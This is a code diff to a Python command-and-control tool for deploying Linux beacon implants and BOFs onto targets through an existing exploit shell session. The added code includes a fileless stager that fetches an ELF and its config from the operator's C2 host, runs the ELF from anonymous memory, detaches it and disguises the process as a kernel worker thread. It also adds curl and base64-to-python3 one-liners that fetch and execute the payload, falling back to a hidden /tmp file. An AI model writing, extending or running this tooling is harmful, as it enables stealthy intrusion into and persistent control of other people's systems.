@@ -5,8 +5,8 @@ exactly as their declaring lazyaddon client describes:
 
 - ``beacon`` (Windows COFF BOFs): the ``bof:url`` command is queued for a
   connected Windows beacon; it downloads the object from the C2
-  ``/download/bofs/<name>`` endpoint and executes it with its internal
-  COFFLoader.
+  ``/bof/<name>`` endpoint (raw base64 object, the upstream wire format)
+  and runs it through COFFLoader.
 - ``blacksandbeacon`` (Linux ELF BOFs): the ``bof:url`` command is queued
   identically; the beacon downloads the position-independent ELF object
   and runs it through its ``RunELF`` loader with the datap argument API.
@@ -58,7 +58,7 @@ BASE_DIR = Path(__file__).resolve().parent.parent
 ADDONS_DIR = BASE_DIR / "lazyaddons"
 DEFAULT_SESSIONS_DIR = BASE_DIR / "sessions"
 BOF_STAGING_SUBDIR = "temp_uploads/bofs"
-BOF_URL_SEGMENT = "bofs"
+BOF_URL_SEGMENT = "bof"
 DEFAULT_TIMEOUT_S = 30.0
 DEPLOY_WAIT_DEFAULT_S = 45.0
 HTTP_TIMEOUT_S = 10.0
@@ -74,13 +74,67 @@ _CHECKOUT_CONFIG_RELPATHS: dict[str, tuple[str, ...]] = {
 }
 _POLL_URI_SEGMENT = "/command/"
 _DEFAULT_BEACON_CLIENT_ID = "linux_beacon"
-_DEPLOY_COMMANDS: dict[str, str] = {
-    "blacksandbeacon": (
-        "curl -sk https://{lhost}:{c2_port}/s/{binary_name} -o {target_path}; "
-        "curl -sk https://{lhost}:{c2_port}/s/{config_name} -o {config_path}; "
-        "chmod 0755 {target_path} && (nohup {target_path} > /dev/null 2>&1 &)"
-    ),
+_FILELESS_STAGER_SCRIPT = """import os,ssl,urllib.request,json
+u=os.environ["BSB_STAGE_URL"].rstrip("/")
+c=ssl._create_unverified_context()
+g=lambda p:urllib.request.urlopen(urllib.request.Request(u+p),context=c).read()
+e=g("/s/blacksandbeacon");n=g("/s/blacksandbeacon_config")
+assert e[:4]==b"\\x7fELF";json.loads(n)
+b=os.memfd_create("",0);os.write(b,e)
+f=os.memfd_create("",0);os.write(f,n)
+if os.fork():os._exit(0)
+os.setsid()
+v=os.open("/dev/null",os.O_WRONLY)
+os.dup2(v,0);os.dup2(v,1);os.dup2(v,2)
+os.execve("/proc/self/fd/%d"%b,["[kworker/u8:2]"],dict(os.environ,BSB_CONFIG="/proc/self/fd/%d"%f))
+"""
+_FILELESS_STAGER_B64 = base64.b64encode(_FILELESS_STAGER_SCRIPT.encode()).decode()
+_STAGE_PAYLOAD_RELPATH = "c2/stage_payload.py"
+
+
+def _stage_payload_b64(external_root: str = "external/.exploit") -> str | None:
+    """Return the upstream diskless stager as base64, when available.
+
+    The upstream stager (``c2/stage_payload.py`` inside the
+    blacksandbeacon checkout) speaks the token-gated ``/stage/`` contract,
+    so the fallback chain prefers it whenever the checkout exists.
+
+    Args:
+        external_root: Checked-out beacon repositories root.
+
+    Returns:
+        Base64 of the stager script, or None when the checkout is absent.
+    """
+    path = Path(BASE_DIR) / external_root / "blacksandbeacon" / _STAGE_PAYLOAD_RELPATH
+    try:
+        source = path.read_bytes()
+    except OSError:
+        return None
+    if b"BSB_STAGE_TOKEN" not in source:
+        return None
+    return base64.b64encode(source).decode()
+
+
+_FILELESS_STAGE_TEMPLATES: list[str] = [
+    # 1. Upstream diskless stager: token-gated /stage/ endpoints,
+    #    AES-CFB + HMAC under HKDF(token), self-signed TLS accepted.
+    "echo {stage_payload_b64} | base64 -d | "
+    "BSB_STAGE_URL='https://{lhost}:{c2_port}' BSB_STAGE_TOKEN='{stage_token}' "
+    "BSB_STAGE_INSECURE_TLS=1 python3 -",
+    # 2. Raw /s/ channel: tokenless memfd loader over the implant-stage
+    #    files (binary + runtime config staged by stage_client).
+    "echo {stager_b64} | base64 -d | "
+    "BSB_STAGE_URL='https://{lhost}:{c2_port}' python3 -",
+    # 3. Last resort: disk-based bootstrap (visible, but works without
+    #    python3-friendliness concerns beyond curl).
+    "curl -sk https://{lhost}:{c2_port}/s/blacksandbeacon -o /tmp/.svc ; "
+    "curl -sk https://{lhost}:{c2_port}/s/blacksandbeacon_config -o /tmp/config.json ; "
+    "chmod 0755 /tmp/.svc && (nohup /tmp/.svc > /dev/null 2>&1 &)",
+]
+_DEPLOY_COMMANDS: dict[str, list[str]] = {
+    "blacksandbeacon": _FILELESS_STAGE_TEMPLATES,
 }
+_DEPLOY_ATTEMPT_WAIT_S = 8.0
 
 
 @dataclass
@@ -249,7 +303,12 @@ def beacon_runtime_config(
             "log_dir": "sessions/logs",
             "upload_dir": "sessions/uploads",
         },
-        "crypto": {"aes_key_hex": key_hex, "mode": "cfb"},
+        "crypto": {
+            "master_key_hex": key_hex,
+            "aes_key_hex": key_hex,
+            "mode": "cfb",
+            "replay_window_seconds": 300,
+        },
         "timing": {
             "sleep_seconds": 6,
             "jitter_percent": 20,
@@ -539,6 +598,8 @@ def _apply_upstream_report_patch(addon: ClientAddon, config: BofDeliveryConfig) 
         touched = True
         aes_path.write_text(aes_source, encoding="utf-8")
         log.info("AES EVP patch applied (%s)", aes_path)
+    elif "CFB-128 mode used by the Python C2" in aes_source:
+        log.info("upstream AES is already CFB-128 python-compatible (%s)", aes_path)
     else:
         log.info("aes source already EVP-based (%s)", aes_path)
     if not touched:
@@ -983,9 +1044,16 @@ def deploy_client(
 
     The target must already expose an exec-capable shell session from the
     atomic exploit bridge (see ``atomic_exploit run`` / ``atomic_shell``).
-    The beacon binary (and its runtime config) are fetched by the target
-    itself over HTTPS directly from the C2 ``/download/`` endpoint, then
-    executed detached.
+    Delivery walks a fallback chain and stops on the first check-in:
+
+    1. Upstream diskless stager — token-gated ``/stage/`` endpoints, the
+       beacon ELF + config are AES-CFB + HMAC protected under HKDF keys
+       derived from the staging token and executed from an anonymous
+       memfd (nothing touches the target disk).
+    2. Raw ``/s/`` channel stager — same memfd execution without the
+       token gate (works when the operator has not assigned one).
+    3. Disk bootstrap — ``curl`` the ELF + config to ``/tmp`` and run
+       detached (last resort, leaves files behind).
 
     Args:
         client: Lazyaddon client (``blacksandbeacon`` for Linux targets).
@@ -995,7 +1063,8 @@ def deploy_client(
         payload: Optional payload.json mapping override (tests).
 
     Returns:
-        ``{success, client_id, reason, deployed}``.
+        ``{success, client_id, reason, deployed, attempts}`` where
+        ``attempts`` keeps one entry per fallback that was tried.
 
     Raises:
         ValueError: Unsupported client or missing staged binary.
@@ -1026,15 +1095,7 @@ def deploy_client(
         raise ValueError(f"client binary staging failed for {addon.name!r}")
     client_id = str(data.get("beacon_client_id", "") or _DEFAULT_BEACON_CLIENT_ID).strip() or _DEFAULT_BEACON_CLIENT_ID
     paths = _deploy_paths(addon)
-    template = _DEPLOY_COMMANDS[addon.name]
-    remote_line = template.format(
-        lhost=payload_lhost,
-        c2_port=c2_port,
-        target_path=paths["target_path"],
-        config_path=paths["config_path"],
-        binary_name=Path(addon.staged_binary).name,
-        config_name=paths["config_name"],
-    )
+    stage_payload_b64 = _stage_payload_b64()
     session = _atomic_session(target)
     if session is None:
         return {
@@ -1043,19 +1104,47 @@ def deploy_client(
             "client_id": "",
             "deployed": False,
         }
-    session.run(remote_line, timeout=60)
+    attempts: list[dict[str, Any]] = []
+    record: dict[str, Any] | None = None
+    remaining = max(1.0, wait)
+    for index, template in enumerate(_DEPLOY_COMMANDS[addon.name], start=1):
+        if "stage_payload_b64" in template and not stage_payload_b64:
+            attempts.append({"attempt": index, "style": "upstream-stage", "ran": False, "skipped": "no checkout"})
+            continue
+        probe = min(_DEPLOY_ATTEMPT_WAIT_S, remaining) if index < len(_DEPLOY_COMMANDS[addon.name]) else remaining
+        remote_line = template.format(
+            lhost=payload_lhost,
+            c2_port=c2_port,
+            target_path=paths["target_path"],
+            config_path=paths["config_path"],
+            binary_name=Path(addon.staged_binary).name,
+            config_name=paths["config_name"],
+            stager_b64=_FILELESS_STAGER_B64,
+            stage_payload_b64=stage_payload_b64 or "",
+            stage_token=str(data.get("stage_token", "") or ""),
+        )
+        session.run(remote_line, timeout=60)
+        style = "disk" if "curl" in template else ("upstream-stage" if "stage_payload_b64" in template else "raw-s")
+        attempts.append({"attempt": index, "style": style, "ran": True, "waited": probe})
+        record = wait_for_beacon(client_id, since=since, timeout=probe, config=cfg, payload=data)
+        if record:
+            break
+        remaining -= probe
+        if remaining <= 0:
+            break
     queue_to_beacon(client_id, "pwd", cfg, data)
-    record = wait_for_beacon(client_id, since=since, timeout=wait, config=cfg, payload=data)
     checked_id = str(record.get("client_id", "")) if record else ""
+    style = attempts[-1]["style"] if attempts else "none"
     return {
         "success": bool(record),
         "client_id": checked_id,
         "deployed": True,
         "reason": (
-            f"beacon {checked_id} checked in"
+            f"beacon {checked_id} checked in after {style} delivery"
             if record
-            else f"delivered {paths['target_path']} but no check-in within {wait:.0f}s (peer may be sleeping)"
+            else f"all {len(attempts)} delivery fallbacks exhausted without check-in within {wait:.0f}s"
         ),
+        "attempts": attempts,
         "record": record,
     }
 
